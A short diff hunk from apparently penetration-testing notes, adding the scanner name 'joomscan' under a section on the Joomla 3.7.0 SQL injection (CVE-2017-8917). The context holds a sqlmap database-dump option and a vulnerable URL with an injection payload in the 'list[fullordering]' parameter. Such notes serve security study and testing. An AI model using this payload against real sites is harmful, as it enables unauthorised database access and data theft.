@@ -335,6 +335,8 @@ Save this request into a text file.
 `--dump` attempts to outputs the entire database  
  
 **Joomla 3.7.0 Sql Injection**  
+joomscan  
+
 ```
 # CVE : - CVE-2017-8917
 URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27
